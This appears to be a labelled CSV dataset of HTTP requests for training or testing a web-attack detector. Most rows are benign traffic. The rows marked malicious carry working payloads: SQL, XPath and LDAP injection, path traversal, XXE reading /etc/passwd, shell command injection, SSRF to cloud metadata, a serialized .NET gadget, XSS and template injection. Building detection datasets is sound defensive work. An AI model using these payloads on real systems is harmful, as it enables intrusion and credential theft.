label,text
benign,"POST /submit/document HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Accept: application/json, text/plain, */*
Referer: https://secure-user-portal.net/upload
Origin: https://secure-user-portal.net
Content-Type: multipart/form-data; boundary=----BoundaryX9UGbOeuL74x9Kw
Content-Length: 733
DNT: 1
Connection: keep-alive

------BoundaryX9UGbOeuL74x9Kw
Content-Disposition: form-data; name=""document""; filename=""meeting_notes.docx""
Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document

PK"
benign,"GET /blog/article/view/123?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiamFuZWRvZSIsImV4cCI6MTY4MjA5MDc2Nn0.ZXOH_Umt2YQyGGcoyRW9t0BNimYAAhDvAbc9WNkTt8c HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
Referer: https://my-personal-blog-site.info/blog/article/list"
malicious,"GET /query_documents?author_id=101%27%20or%20string-length(user%2Fpassword%5B1%5D)%20%3E%205%20or%20%27a%27%3D%27a HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/xml, text/xml, */*
Accept-Language: en-US,en;q=0.7
Accept-Encoding: br, gzip, deflate
Cache-Control: no-cache
Connection: keep-alive"
benign,"POST /settings/email/preferences HTTP/1.1
Host: notifications-central.cloud
Content-Type: application/json
Content-Language: en-US
User-Agent: Python-urllib/3.11
Accept: */*
Content-Length: 59
Connection: close

{""emailId"":""user1234"",""preferences"":{""promos"":false,""alerts"":true}}"
benign,"GET /data/archive/report-2024-q1.csv HTTP/1.1
Host: corporate-datastream.biz
User-Agent: curl/7.88.1
Range: bytes=0-1023
Accept: text/csv
Accept-Language: en
Connection: close"
malicious,"GET /report/generate?src=..%u2216..%u2216..%u2216usr%u2216local%u2216apache2%u2216logs HTTP/1.1
Host: logs.analytics-cloud.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml
Accept-Language: en-US,en;q=0.7
Referer: https://analytics-cloud.net/report/dashboard
Cache-Control: no-cache
Connection: keep-alive"
malicious,"POST /api/search HTTP/1.1
Host: login.registry-network.io
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate, br
Accept: application/json
Content-Length: 61
Connection: close

user_id=testuser%29%28objectClass%3D*%29&attributes=%2A"
benign,"HEAD /index.html HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.28.2
Accept-Encoding: gzip, deflate
Accept: application/json
Connection: keep-alive
X-Requested-With: XMLHttpRequest"
malicious,"POST /sync/xml-load HTTP/1.1
Host: docs-integration-hub.org
Content-Type: application/xml
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: application/xml, text/xml
Cache-Control: max-age=0
Content-Length: 479

<?xml version=""1.0"" encoding=""UTF-8""?>
<SyncRequest>
  <SerializedData><![CDATA[AAEAAAD/////AQAAAAAAAAADDQAAACJTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgAAAABJU3lzdGVtLkNvbmZpZ3VyYXRpb24uSW5zdGFsbC5Bc3NlbWJseUltcGxlbWVudGVyAwAAAAVTeXN0ZW0uRHlhZ25vc3RpY3MuUHJvY2Vzcy5TdGFydAA=]]></SerializedData>
</SyncRequest>"
benign,"GET /api/v1/items/lookup?filter=param%3DHello%252520World HTTP/1.1
Host: api.freshmarket-online.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.8
X-Requested-With: XMLHttpRequest
Connection: close"
benign,"GET /images/logo.svg HTTP/1.1
Host: cloud-photo-storage.net
Accept: image/svg+xml,image/*;q=0.9,*/*;q=0.7
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Accept-Encoding: gzip, deflate, br
Cache-Control: max-age=86400
Connection: keep-alive"
benign,"GET /recipes/search?ingredient=chicken&ingredient=garlic&ingredient=lemon&cuisine=mediterranean HTTP/1.1
Host: healthyhome-cooking.com
Connection: keep-alive
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Language: en-US,en;q=0.5"
benign,"PATCH /api/v1/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0
Accept-Encoding: gzip, deflate, br
Content-Type: application/json-patch+json
Accept: application/json
Content-Length: 62
Connection: close

[{""op"": ""replace"", ""path"": ""/notifications/push"", ""value"": true}]"
malicious,"POST /app/xml/submitOrder HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/xml
Accept: application/xml, text/xml
Cache-Control: no-cache
Content-Length: 194

<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE order [
<!ELEMENT order ANY >
<!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
<product>
  <productId>&xxe;</productId>
  <description>Some product</description>
</product>"
malicious,"GET /api/v1/status/check/device-alpha%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Python-urllib/3.9
Accept: application/json
X-Requested-With: XMLHttpRequest
Connection: close"
benign,"POST /blog/comments/add HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.8
Connection: keep-alive

comment=Thanks+for+explaining+how+to+use+WHERE+clauses+effectively+in+a+SELECT+statement,+very+helpful+post!"
benign,"POST /api/v3/items/search HTTP/1.1
Host: marketplace.smart-things-store.io
Content-Type: application/json
Accept: application/json
Origin: https://marketplace.smart-things-store.io
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.Zm9vLmJhcg._rYdhc65xibRslEAF6LD9JLR_G-10dK6pFG4GJ9VI14
X-CSRF-Token: 88x12b7f9d38407f87eac51751615501
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
Cache-Control: no-store

{""query"":""wireless headphones"",""filters"":{""brand"":[""BrandX"",""SoundTech""],""priceRange"":{""min"":50,""max"":150}},""sort"":""popularity""}"
benign,"GET /favicon.ico HTTP/1.1
Host: virtual-events-gallery.org
Connection: close
Accept: image/x-icon,image/vnd.microsoft.icon,*/*;q=0.5
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8"
malicious,"GET /admin/run_backup_script.sh?host=10.0.0.15%3B%20cat%20%2Fetc%2Fpasswd HTTP/1.1
Host: secure-file-storage.io
User-Agent: curl/7.77.0
Accept: */*
Connection: close"
benign,"PUT /api/v1/legal-documents/batch-upload HTTP/1.1
Host: corporate-legal-data.info
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlcmFkbWluIiwicm9sZSI6ImFkbWluIn0.1jSOzNW6F_XJYpaiwUrY4vQBpxNQSjkYFA8X9dFlsXQ
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.198 Safari/537.36
Content-Length: 11178
Connection: close

{""documents"":[{""docId"":""LD-100234"",""title"":""Non-Disclosure Agreement"",""version"":""1.3"",""content"":""All parties shall maintain confidentiality of proprietary information disclosed during the term of this agreement."",""effectiveDate"":""2023-11-01"",""tags"":[""nda"",""confidentiality"",""legal""]},{""docId"":""LD-100235"",""title"":""Employment Contract"",""version"":""2.0"",""content"":""The employee agrees to the terms and conditions outlined herein, including job responsibilities and compensation."",""effectiveDate"":""2024-01-15"",""tags"":[""employment"",""contract"",""hr""]} /* Total 150 documents full text and metadata, approx 11 KB JSON body */]}"
benign,"OPTIONS /user-management/api/v1/accounts/42faae HTTP/1.1
Host: identity-authentication.work
Origin: https://portal.education-center.club
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: authorization
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36
Accept: */*
Connection: keep-alive"
benign,"POST /api/v3/auth/login HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/json
Accept: application/json
X-Requested-With: FetchAPIClient
Origin: https://my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Length: 80

{""username"":""eliana_brook"",""password"":""SunsetDrive@2024""}"
benign,"GET /news/2024/policy-updates HTTP/1.1
Host: civic-information-hub.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
If-Modified-Since: Tue, 22 Aug 2023 13:30:00 GMT
DNT: 1
Connection: keep-alive
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15
Accept-Language: en-US,en;q=0.5
Cache-Control: max-age=0"
benign,"POST /newsletter/subscribe HTTP/1.1
Host: freshfood-scene.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 2631
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: no-cache

email=jake.turner%40freshfood-scene.com&preferences=weekly%2Choliday+recipes%2Cseasonal+fruit&comments=I%E2%80%99ve+been+following+your+newsletter+for+almost+a+year+now%2C+and+it+has+become+a+highlight+in+my+inbox.+Your+recipes+are+always+diverse+and+catered+to+a+wide+range+of+tastes+and+dietary+needs.+The+detailed+tips+on+ingredient+selection+have+greatly+improved+my+cooking+skills.+I+love+the+focus+on+fresh+and+local+produce%2C+which+makes+each+meal+feel+both+nutritious+and+satisfying.+Thank+you+for+posting+such+inspired+and+thoughtful+content+regularly.+Looking+forward+to+every+new+edition."
benign,"POST /user/contact HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Accept-Language: en-US,en;q=0.9
Cache-Control: no-cache
Connection: close
Origin: https://secure-user-portal.net

username=james_brown&message=Please+note+that+to+UPDATE+the+database,+you+should+use+WHERE+clauses+carefully+to+avoid+errors."
benign,"GET /resources/images/hero-banner.webp HTTP/1.1
Host: vintage-craftsmarket.net
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15
Connection: keep-alive
Cache-Control: max-age=604800"
malicious,"POST /profiles/save HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: application/json,text/javascript,*/*;q=0.01
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 96

comment=all%20set&username=userX&action=update&username=admin&action=delete&comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E"
benign,"GET /api/v2/inventory/items/search?category=electronics&availability=in_stock&sort=price_asc HTTP/1.1
Host: retail-stockroom.io
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Mobile Safari/537.36
X-Forwarded-For: 203.0.113.45
Connection: keep-alive"
benign,"GET /api/customer/feedback/c2ddb58a HTTP/1.1
Host: feedback-center-services.org
Accept: application/json
Authorization: Bearer eyJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.kffnpB57VL8RHRuOq9oXsA
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
X-Forwarded-For: 66.249.66.1
Connection: keep-alive"
malicious,"GET /fetcher?url=http%3A%2F%2Fcdn.imagesync-media.org%2Favatar.jpg&format=jpeg&url=http%3A%2F%2F169.254.169.254%2Flatest%2Fuser-data HTTP/1.1
Host: edge-gateway.imagesync-media.org
User-Agent: Python-urllib/3.8
Accept-Language: en-US,en;q=0.7
Pragma: no-cache"
benign,"GET /docs/ev_charging_station_specs.pdf HTTP/1.1
Host: greenmobility-solutions.org
Accept: application/pdf
Referer: https://greenmobility-solutions.org/products/ev-stations
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Accept-Encoding: gzip, deflate"
benign,"GET /images/logo.svg HTTP/1.1
Host: secure-user-portal.net
Accept: image/svg+xml,image/*,*/*;q=0.7
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1
Referer: https://secure-user-portal.net/dashboard
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"GET /app/settings?greeting=%7B%7B%207*%277%27%7D%7D HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /events/list?tag=music&tag=festival&tag=outdoors&date=2024-07-20 HTTP/1.1
Host: citylife-hub.net
Connection: close
Accept: application/json, text/javascript, */*; q=0.01
Referer: https://citylife-hub.net/
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15
Accept-Language: en-US,en;q=0.8"
benign,"POST /upload/image HTTP/1.1
Host: photoshare-secure.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryZyx81aJ1CfOErH5P
Origin: https://photoshare-secure.io
Referer: https://photoshare-secure.io/upload
Cookie: sessionid=4b9f8aeca1d47e83ab2c5c1d7fab3f26; csrftoken=9e7b5a1a4f8d90f1
Content-Length: 312
Connection: keep-alive

------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""caption""

Vacation in Spain
------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""album_id""

5962
------WebKitFormBoundaryZyx81aJ1CfOErH5P
Content-Disposition: form-data; name=""image_file""; filename=""photo123.jpg""
Content-Type: image/jpeg

(simulated binary image data)
------WebKitFormBoundaryZyx81aJ1CfOErH5P--"
malicious,"POST /app/v1/catalog/query HTTP/1.1
Host: smart-solutions-cloud.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36
Accept: text/xml,application/xml
Content-Type: application/xml
Content-Length: 146
Origin: https://dashboard.smart-solutions-cloud.ai

<searchRequest><term>' or '1'='1' or name()='</term><category>gadgets</category></searchRequest>"
benign,"GET /media/search?search=SELECT%20best%20option%20FROM%20list HTTP/1.1
Host: digital-archive-cloud.tv
Accept: */*
Accept-Language: en-US,en;q=0.8
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Connection: close"
benign,"PUT /api/settings/user/87 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer A1B2C3D4E5F6G7H8I9J0K1L2M3N4O5P6
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.5

{""userId"":87,""language"":""en-GB"",""theme"":""dark"",""emailNotifications"":true,""privacySettings"":{""profileVisibility"":""friends_only"",""searchEngineIndexing"":false}}"
benign,"POST /member/profile/update HTTP/1.1
Host: social-connect-platform.xyz
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Origin: https://social-connect-platform.xyz
Referer: https://social-connect-platform.xyz/member/profile/update
Cookie: auth_sid=9561d3ab89d14f347dfg6451fabdce03; HttpOnly; Secure
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive

display_name=SocialButterfly&bio=Connecting+people+one+profile+at+a+time.&website_url=https%3A%2F%2Fsocialbutterfly.xyz&location=Miami%2C+Florida"
benign,"POST /api/v2/user/preferences HTTP/1.1
Host: api.cloud-data-services.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
User-Agent: python-requests/2.31.0
Accept: application/json
X-CSRF-Token: 8zf6f4a9XWRLs2q94pTQ
Connection: keep-alive

email_notifications=yes&privacy_level=standard&alerts=sms"
benign,"PUT /api/v3/config/device/987654321/image HTTP/1.1
Host: iot-device-portal.tech
User-Agent: Python-urllib/3.10
Content-Type: application/octet-stream
Content-Length: 220
Authorization: ApiKey a1b2c3d4e5f67890abcdef1234567890
Accept-Encoding: gzip
Connection: close

QW4gaW9UIERldmljZSBpbWFnZSB1cGxvYWQgdXNpbmcgYmluYXJ5LWRhdGEgZW5jb2RlZCBpbiBCYXNlNjQuDQpBY3R1YWwgZGF0YSBpbXBsZW1lbnRhdGlvbi4="
malicious,"GET /image/process?img=..%c0%ae%c0%af..%c0%ae%c0%af..%c0%ae%c0%afboot%c0%afgrub%c0%afgrub.cfg HTTP/1.1
Host: media-streaming.video-hub.ai
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0
Accept: image/avif,image/webp,*/*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
malicious,"GET /records/12' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT CURRENT_USER()),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --/details HTTP/1.1
Host: tech-support-center.net
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://tech-support-center.net/support/tickets
User-Agent: Python-urllib/3.9"
benign,"GET /sitemap_index.xml HTTP/1.1
Host: global-green-energy.ai
Accept: text/xml, application/xml;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /media/photos/search?filter%5Byear%5D=2023&filter%5Bcategory%5D=nature&sort_by=date_desc&page=1 HTTP/1.1
Host: vividcaptures-gallery.org
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: text/html
Referer: https://vividcaptures-gallery.org/
Connection: keep-alive"
benign,"GET /health HTTP/1.1
Host: api-global-metrics.cloudstats.ai
User-Agent: Datadog-Synthetics/1.0
Accept: application/json
Connection: close"
benign,"POST /user/profile/update HTTP/1.1
Host: mypetprofiles.petcare-zone.biz
Content-Type: application/x-www-form-urlencoded
Content-Length: 1204
User-Agent: curl/7.79.1
Accept: */*
Connection: close

userId=238947&petName=Whiskers&age=5&description=Whiskers+is+a+delightful+domestic+short-haired+cat+who+lives+for+playtime+and+cuddles.+She+enjoys+chasing+laser+pointers+and+has+a+special+fondness+for+catnip+toys.+Every+morning%2C+she+greets+us+with+a+soft+purr+and+a+gentle+rub+against+our+legs.+Whiskers+has+been+thriving+since+her+adoption+two+years+ago+and+is+in+excellent+health.+Our+family+values+her+companionship+immensely+and+takes+pride+in+providing+her+a+happy+and+stimulating+environment."
benign,"DELETE /api/v1/users/98213 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abc123.def456
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"PUT /user/preferences/theme HTTP/1.1
Host: personalized-content.net
If-Match: ""cc13fa5e-8f90-4d41-af3e-8728e7a6f234""
Content-Type: application/json
Authorization: Bearer abcdef1234567890abcd1234ef567890
Accept-Language: en-GB,en;q=0.8
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Safari/604.1
Content-Length: 33
Connection: keep-alive

{""theme"":""midnight"",""fontSize"":14}"
benign,"POST /contact/support HTTP/1.1
Host: tech-helpdesk-hub.io
User-Agent: python-requests/2.31.0
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Content-Length: 115
Connection: keep-alive

message=I+have+a+question+regarding+how+to+properly+use+WHERE+clauses+when+building+complex+filter+conditions."
benign,"DELETE /api/v5/tasks/11890 HTTP/1.1
Host: team-collaboration-platform.app
Authorization: Bearer t8mjBkE3NsuOfv\d9x
If-Match: ""bbc724d5""
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json
Cache-Control: no-store
Connection: keep-alive"
benign,"HEAD /user/profile/settings HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.88.1
Accept: */*
Connection: close
Pragma: no-cache"
malicious,"GET /network/utils/endpoint-9f3%20%7C%20hostname%20%7C%20whoami HTTP/1.1
Host: devops-control-plane.cloud
User-Agent: Python-urllib/3.9
Accept: */*
Connection: close"
benign,"GET /robots.txt HTTP/1.1
Host: student-resource-hub.edu
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
Accept: text/plain, text/*, */*
Accept-Language: en-US,en;q=0.5
Pragma: no-cache
Connection: keep-alive"
benign,"GET /dashboard/report?cmd=view_details&date=2024-06-12 HTTP/1.1
Host: insights-analytics-suite.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://insights-analytics-suite.co/home
Cache-Control: max-age=0"
benign,"GET /robots.txt HTTP/1.1
Host: digital-marketing-hub.co.uk
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Mobile Safari/537.36
Accept: text/plain, */*
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: keep-alive"
malicious,"POST /app/user/settings HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Content-Length: 69
Connection: keep-alive

nickname=PixelNinja&preferences%5Bnotifications%5D=enabled&role_id=1&internal_user_status=ACTIVE"
benign,"POST /community/new-post HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded
Content-Length: 492
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Referer: https://community.game-dev-forum.org/forums/general-discussion
Cookie: forum_session=348d02a7ec8f9a5c123b2f97846287cd

title=Looking+for+feedback+on+my+new+platformer&category=Game+Design&tags=platformer%2Cfeedback%2Clevel-design%2Cgameplay%2Cbeta&content=I+finished+the+first+three+levels+and+would+love+some+input+on+game+feel%2C+mechanics%2C+and+difficulty.+Thanks+in+advance%21&anonymous_posting=no&notify_replies=yes&post_visibility=public&allow_embedded_media=yes&language=en&font_size=medium&signature_enabled=true&email_notifications=yes&rating_feedback_enabled=true&poll_included=no&attached_images_count=2&image_captions=Level+1+screenshot%2CLevel+3+enemy+battle&linked_resources=https%3A%2F%2Fmygamesite.org%2Fplatformer-demo.zip%2Chttps%3A%2F%2Fyoutu.be%2Fabcdefg12345&post_format=standard&created_from_app=false&csrf_token=375ea91b09dc49abc8b7e5a0ac45afd1"
benign,"POST /write/message HTTP/1.1
Host: chatroom-dev-space.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://chatroom-dev-space.net/messages/recent
Connection: keep-alive

message=Can+someone+help+me+understand+why+the+%3Cdiv%3E+element+doesn%27t+display+when+I+set+innerHTML+with+document.getElementById%28%27content%27%29.innerHTML+%3D+%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3F"
